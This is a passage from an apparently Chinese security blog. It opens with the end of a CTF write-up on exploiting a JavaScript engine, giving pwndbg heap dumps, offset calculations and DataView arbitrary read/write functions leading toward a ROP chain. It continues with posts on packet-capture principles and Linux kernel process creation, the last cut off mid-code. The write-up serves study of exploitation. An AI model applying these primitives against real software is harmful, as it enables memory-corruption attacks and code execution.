<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -s AAAA</span><br><span class="line">[heap]          <span class="number">0x5555556257b0</span> <span class="number">0x41414141</span> <span class="comment">/* &#x27;AAAA&#x27; */</span></span><br><span class="line">pwndbg&gt; search -t qword <span class="number">0x5555556257b0</span></span><br><span class="line">[heap]          <span class="number">0x555555625030</span> <span class="number">0x5555556257b0</span></span><br><span class="line">    </span><br><span class="line">pwndbg&gt; search -s BBBB</span><br><span class="line">[heap]          <span class="number">0x5555556267b0</span> <span class="number">0x42424242</span> <span class="comment">/* &#x27;BBBB&#x27; */</span></span><br><span class="line">pwndbg&gt; search -t qword <span class="number">0x5555556267b0</span></span><br><span class="line">[heap]          <span class="number">0x555555625260</span> <span class="number">0x5555556267b0</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>a1-&gt;buffer_p(0x5555556257b0)：AAAA</code></li>
<li><code>d1-&gt;buffer_p(0x555555625030)：0x5555556257b0</code></li>
<li><code>a2-&gt;buffer_p(0x5555556267b0)：BBBB</code></li>
<li><code>d2-&gt;buffer_p(0x555555625260)：0x5555556267b0</code></li>
</ul>
<p>如果我们想利用 <code>a</code> 的溢出点，必须先知道 <code>jerry_global_heap</code> 才能计算 <code>property_list_cp</code> ，而源程序没有符号表，我们只能通过对比源程序和我们自己编译的程序来获取这个值：（不知道的偏移都可以利用这个方法来解决）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55555566a000</span>+<span class="number">0x17b0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55555566b7b0</span> (jerry_global_heap+<span class="number">2896</span>) ◂— <span class="number">0x42424152</span> <span class="comment">/* &#x27;RABB&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55555566b7b8</span> (jerry_global_heap+<span class="number">2904</span>) ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x55555566b7b0</span><span class="number">-2896</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55555566ac60</span> (jerry_global_heap) ◂— <span class="number">0x8e8</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55555566ac68</span> (jerry_global_heap+<span class="number">8</span>) ◂— <span class="number">0x20010800be0031</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55555566ac70</span> (jerry_global_heap+<span class="number">16</span>) ◂— <span class="number">0x100000066</span> <span class="comment">/* &#x27;f&#x27; */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x555555624000</span>+<span class="number">0x17b0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5555556257b0</span> ◂— <span class="number">0x41414141</span> <span class="comment">/* &#x27;AAAA&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5555556257b8</span> ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555556257b0</span><span class="number">-2896</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x555555624c60</span> ◂— <span class="number">0x658</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x555555624c68</span> ◂— <span class="number">0x2000d500be0031</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x555555624c70</span> ◂— <span class="number">0x100000066</span> <span class="comment">/* &#x27;f&#x27; */</span></span><br></pre></td></tr></table></figure>
<p>根据公式 <code>jerry_globals_heap + array-&gt;u1.property_list_cp &lt;&lt; 3</code> 进行计算：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">25</span>]: hex(<span class="number">0x555555624c60</span>+(<span class="number">0x64</span>&lt;&lt;<span class="number">3</span>))</span><br><span class="line">Out[<span class="number">25</span>]: <span class="string">&#x27;0x555555624f80&#x27;</span></span><br></pre></td></tr></table></figure>
<p>修改前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x555555624f80</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x555555624f80</span> ◂— <span class="number">0x8800000310</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x555555624f88</span> ◂— <span class="number">0x8800000088</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x555555624fa0</span> ◂— <span class="number">0x25006e00620018</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x555555624fa8</span> ◂— <span class="number">0x100000012</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x555555624fb0</span> ◂— <span class="number">0x3c300587d37</span> <span class="comment">/* &#x27;7&#125;X&#x27; */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x555555624fb8</span> ◂— <span class="number">0x12f007200000343</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x555555624fc0</span> ◂— <span class="number">0x20000000680011</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x555555624fc8</span> ◂— <span class="number">0x100000040</span> <span class="comment">/* &#x27;@&#x27; */</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x555555624fd0</span> ◂— <span class="number">0x10000078c8</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x555555624fd8</span> ◂— <span class="number">0x10a01a900000363</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x555555624fe0</span> ◂— <span class="number">0xe40c292c0000002b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x555555624fe8</span> ◂— <span class="number">0x605040477616100</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x555555624ff0</span> ◂— <span class="number">0x1c24b8a70000002b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x555555624ff8</span> ◂— <span class="number">0x100f0e0e0d316101</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x555555625000</span> ◂— <span class="number">0x881d13e60000002b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0x555555625008</span> ◂— <span class="number">0x1c1b1a1a19316401</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0x555555625010</span> ◂— <span class="number">0xb400b20074008b</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│  <span class="number">0x555555625018</span> ◂— <span class="number">0xd300d000cd0076</span> <span class="comment">/* &#x27;v&#x27; */</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│  <span class="number">0x555555625020</span> ◂— <span class="number">0x6c0000006c0012</span></span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│  <span class="number">0x555555625028</span> ◂— <span class="number">0x100000000319</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│  <span class="number">0x555555625030</span> —▸ <span class="number">0x5555556257b0</span> ◂— <span class="number">0x41414141</span> <span class="comment">/* &#x27;AAAA&#x27; */</span></span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│  <span class="number">0x555555625038</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>修改后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x555555624f80</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x555555624f80</span> ◂— <span class="number">0x25000000c80018</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x555555624f88</span> ◂— <span class="number">0x100200004</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x555555624f90</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x555555624f98</span> —▸ <span class="number">0x5555556253b8</span> —▸ <span class="number">0x555555625168</span> —▸ <span class="number">0x5555556253b0</span> —▸ <span class="number">0x5555556253c0</span> ◂— ...</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x555555624fa0</span> ◂— <span class="number">0x25006e00620018</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x555555624fa8</span> ◂— <span class="number">0x100000012</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x555555624fb0</span> ◂— <span class="number">0x3c300587d37</span> <span class="comment">/* &#x27;7&#125;X&#x27; */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x555555624fb8</span> ◂— <span class="number">0x12f007200000343</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x555555624fc0</span> ◂— <span class="number">0x20000000680011</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x555555624fc8</span> ◂— <span class="number">0x100000040</span> <span class="comment">/* &#x27;@&#x27; */</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x555555624fd0</span> ◂— <span class="number">0x10000078c8</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x555555624fd8</span> ◂— <span class="number">0x10a01a900000363</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x555555624fe0</span> ◂— <span class="number">0xe40c292c0000002b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x555555624fe8</span> ◂— <span class="number">0x605040477616100</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x555555624ff0</span> ◂— <span class="number">0x1c24b8a70000002b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x555555624ff8</span> ◂— <span class="number">0x100f0e0e0d316101</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x555555625000</span> ◂— <span class="number">0x881d13e60000002b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0x555555625008</span> ◂— <span class="number">0x1c1b1a1a19316401</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0x555555625010</span> ◂— <span class="number">0xb400b20074008b</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│  <span class="number">0x555555625018</span> ◂— <span class="number">0xd300d000cd0076</span> <span class="comment">/* &#x27;v&#x27; */</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│  <span class="number">0x555555625020</span> ◂— <span class="number">0x6c0000006c0012</span></span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│  <span class="number">0x555555625028</span> ◂— <span class="number">0x100000000319</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│  <span class="number">0x555555625030</span> —▸ <span class="number">0x555555625260</span> —▸ <span class="number">0x7fffffffde60</span> —▸ <span class="number">0x7ffff7ea2afe</span> (execvpe+<span class="number">638</span>) ◂— mov    rdx, r12</span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│  <span class="number">0x555555625038</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>这个 <code>a[0x2c]</code> 对应的地址就是 <code>0x555555625030</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x555555624f80</span>+<span class="number">0x4</span>*<span class="number">0x2c</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x555555625030</span> —▸ <span class="number">0x555555625260</span> —▸ <span class="number">0x7fffffffde60</span> —▸ <span class="number">0x7ffff7ea2afe</span> (execvpe+<span class="number">638</span>) ◂— mov    rdx, r12</span><br></pre></td></tr></table></figure>
<ul>
<li><code>0x5555556257b0</code>（<code>a1-&gt;buffer_p</code>）被修改为了 <code>0x555555625260</code>（<code>d2-&gt;buffer_p</code>）</li>
<li>这下 <code>a1-&gt;buffer_p</code> 和 <code>a2-&gt;buffer_p</code> 都指向 <code>d2-&gt;buffer_p</code>，就可以实现 WAA 和 RAA 了</li>
</ul>
<p>最后的问题就是 WAA 和 RAA 的实现：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aar</span>(<span class="params">addr, dv1, dv2</span>)</span>&#123;</span><br><span class="line">    dv1.setBigUint64(<span class="number">0</span>, addr, <span class="literal">true</span>); <span class="comment">/* 先写入一个地址 */</span></span><br><span class="line">    <span class="keyword">if</span>(dv2.buffer)&#123;</span><br><span class="line">        <span class="keyword">return</span> dv2.getBigUint64(<span class="number">0</span>, <span class="literal">true</span>); <span class="comment">/* 返回该地址中的数据 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aaw</span>(<span class="params">addr, value, dv1, dv2</span>)</span>&#123;</span><br><span class="line">    dv1.setBigUint64(<span class="number">0</span>, addr, <span class="literal">true</span>); <span class="comment">/* 先写入一个地址 */</span></span><br><span class="line">    dv2.setBigUint64(<span class="number">0</span>, value, <span class="literal">true</span>); <span class="comment">/* 再向这个地址中写入数据 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后就是用 WWR 从 <code>environ</code> 中读出栈地址，然后在 <code>libc_start_main</code> 的返回值上构造 ROP 链，最后执行 one_gadget</p>
<p>PS：在交互时需要把 <code>\n</code> 去掉，还有注释也要去掉 </p>
<p><strong>小结：</strong></p>
<p>调了好多天终于弄好了，现在对这种 JavaScript 引擎的题目应该是有所了解了，主要就是靠 ArrayBuffer 和 DataView 这两个函数</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/19/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/19/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">网络相关知识：网络抓包原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-19 10:51:24 / Modified: 10:53:35" itemprop="dateCreated datePublished" datetime="2022-08-19T10:51:24+08:00">2022-08-19</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>556</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>1 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="手机-App-抓包"><a href="#手机-App-抓包" class="headerlink" title="手机 App 抓包"></a>手机 App 抓包</h2><p>要实现对 App 的网络数据抓包，需要监控 App 与服务器交互之间的网络节点，监控其中任意一个网络节点（网卡），获取所有经过网卡中的数据，对这些数据按照网络协议进行解析，这就是抓包的基本原理</p>
<p>但是中间网络节点，不受我们控制，所以基本无法实现抓包的，只能在客户端和服务端进行抓包</p>
<p>通常我们监控本地网卡数据，如下图： </p>
<img src="/2022/08/19/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86/1660838000697.png" class width="1660838000697"> 
<p><code>本地网络</code> 指的是WIFI的路由，如果直接抓路由器的包还是比较麻烦的，因此我们会在 <code>手机</code> 和 <code>本地路由</code> 之间加一层 <code>代理服务</code>，这样只要抓代理服务的网络数据即可：</p>
<img src="/2022/08/19/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86/1660838017257.png" class width="1660838017257"> 
<h2 id="Linux-抓包"><a href="#Linux-抓包" class="headerlink" title="Linux 抓包"></a>Linux 抓包</h2><p>Linux 抓包是通过 <strong>注册一种虚拟的底层网络协议</strong> 来完成对网络报文（准确的说是网络设备）消息的处理权</p>
<ul>
<li>当网卡接收到一个网络报文之后，它会遍历系统中所有已经注册的网络协议（例如，以太网协议，x25协议处理模块）来尝试进行报文的解析处理（这一点和一些文件系统的挂载相似，就是让系统中所有的已经注册的文件系统来进行尝试挂载，如果哪一个认为自己可以处理，那么就完成挂载）</li>
<li><p>当抓包模块把自己伪装成一个网络协议的时候，系统在收到报文的时候就会给这个伪协议一次机会，让它来对网卡收到的报文进行一次处理，此时该模块就会趁机对报文进行窥探，也就是把这个报文完完整整的复制一份，假装是自己接收到的报文，汇报给抓包模块 </p>
<p>具体是使用 libpcap 获取被监听网络接口的数据 </p>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">Linux内核学习笔记（持续更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-08-18 23:38:46" itemprop="dateCreated datePublished" datetime="2022-08-18T23:38:46+08:00">2022-08-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-08-19 17:40:17" itemprop="dateModified" datetime="2022-08-19T17:40:17+08:00">2022-08-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Linux-内核简述"><a href="#Linux-内核简述" class="headerlink" title="Linux 内核简述"></a>Linux 内核简述</h2><p>Linux 的内核虽然是基于单内核的，但是经过这么多年的发展，也具备微内核的一些特征（体现了 Linux 实用至上的原则）</p>
<p>主要有以下特征：</p>
<ul>
<li>支持动态加载内核模块</li>
<li>支持对称多处理（SMP）</li>
<li>内核可以抢占（preemptive），允许内核运行的任务有优先执行的能力</li>
<li>不区分线程和进程</li>
</ul>
<h2 id="Linux-内核源码的结构"><a href="#Linux-内核源码的结构" class="headerlink" title="Linux 内核源码的结构"></a>Linux 内核源码的结构</h2><div class="table-container">
<table>
<thead>
<tr>
<th><strong>目录</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>arch</td>
<td>特定体系结构的代码</td>
</tr>
<tr>
<td>block</td>
<td>块设备I/O层</td>
</tr>
<tr>
<td>crypo</td>
<td>加密API</td>
</tr>
<tr>
<td>Documentation</td>
<td>内核源码文档</td>
</tr>
<tr>
<td>drivers</td>
<td>设备驱动程序</td>
</tr>
<tr>
<td>firmware</td>
<td>使用某些驱动程序而需要的设备固件</td>
</tr>
<tr>
<td>fs</td>
<td>VFS和各种文件系统</td>
</tr>
<tr>
<td>include</td>
<td>内核头文件</td>
</tr>
<tr>
<td>init</td>
<td>内核引导和初始化</td>
</tr>
<tr>
<td>ipc</td>
<td>进程间通信代码</td>
</tr>
<tr>
<td>kernel</td>
<td>像调度程序这样的核心子系统</td>
</tr>
<tr>
<td>lib</td>
<td>同样内核函数</td>
</tr>
<tr>
<td>mm</td>
<td>内存管理子系统和VM</td>
</tr>
<tr>
<td>net</td>
<td>网络子系统</td>
</tr>
<tr>
<td>samples</td>
<td>示例，示范代码</td>
</tr>
<tr>
<td>scripts</td>
<td>编译内核所用的脚本</td>
</tr>
<tr>
<td>security</td>
<td>Linux 安全模块</td>
</tr>
<tr>
<td>sound</td>
<td>语音子系统</td>
</tr>
<tr>
<td>usr</td>
<td>早期用户空间代码（所谓的initramfs）</td>
</tr>
<tr>
<td>tools</td>
<td>在Linux开发中有用的工具</td>
</tr>
<tr>
<td>virt</td>
<td>虚拟化基础结构</td>
</tr>
</tbody>
</table>
</div>
<h2 id="进程和线程"><a href="#进程和线程" class="headerlink" title="进程和线程"></a>进程和线程</h2><p>进程和线程是程序运行时状态，是动态变化的，进程和线程的管理操作（比如，创建，销毁等）都是有内核来实现的</p>
<p>Windows：开启的一个程序就是一个线程，它只是一个容器，用于装载系统资源，它并不执行代码，它是系统资源分配的最小单元，而在进程中执行代码的是线程，是代码执行的最小单位</p>
<p>Linux：Linux 中的进程于 Windows 相比是很轻量级的，而且不严格区分进程和线程，Linux 的进程就是 Windows 中的线程，线程就是轻量级的进程</p>
<p><strong>Linux 进程的创建</strong></p>
<p>Linux 中创建进程与其他系统有个主要区别，Linux 中创建进程分2步：fork() 和 exec() </p>
<ul>
<li>fork：通过拷贝当前进程创建一个子进程</li>
<li>exec：读取可执行文件，将其载入到内存中运行</li>
</ul>
<p>创建的流程： </p>
<ul>
<li>fork() 的底层是 _do_fork()，在其中会调用 copy_process()</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = copy_process(clone_flags, stack_start, stack_size,</span><br><span class="line">		 child_tidptr, <span class="literal">NULL</span>, trace, tls, NUMA_NO_NODE); <span class="comment">/* task_struct *p */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>调用 dup_task_struct() 为新进程分配内核栈，task_struct 等，其中的内容与父进程相同</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = dup_task_struct(current, node); <span class="comment">/* task_struct *p */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>check 新进程（进程数目是否超出上限等）</li>
<li>清理新进程的信息（比如 PID 置0等），使之与父进程区别开</li>
<li>新进程状态置为 TASK_UNINTERRUPTIBLE</li>
<li>更新 task_struct 的 flags 成员</li>
<li>执行调度程序相关设置，将此任务分配给 CPU，然后调用 copy 系列函数复制所有进程信息</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">shm_init_task(p);</span><br><span class="line">retval = security_task_alloc(p, clone_flags);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_audit;</span><br><span class="line">retval = copy_semundo(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_security;</span><br><span class="line">retval = copy_files(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_semundo;</span><br><span class="line">retval = copy_fs(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_files;</span><br><span class="line">retval = copy_sighand(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_fs;</span><br><span class="line">retval = copy_signal(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_sighand;</span><br><span class="line">retval = copy_mm(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_signal;</span><br><span class="line">retval = copy_namespaces(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> 